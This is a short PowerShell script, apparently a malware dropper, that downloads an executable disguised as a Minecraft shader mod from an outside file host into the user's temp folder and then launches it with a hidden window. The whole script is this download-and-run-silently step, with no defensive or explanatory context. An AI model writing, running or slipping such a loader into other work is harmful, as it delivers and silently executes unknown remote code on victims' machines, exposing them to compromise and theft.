$fileUrl = "https://filehost.fun/BetterMC_EnhancedShaders.exe"
$destinationPath = "$env:TEMP\BetterMC_EnhancedShaders.exe"

# Download the file to temp folder
Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath -UseBasicParsing

# Automatically run it hidden
Start-Process -FilePath $destinationPath -WindowStyle Hidden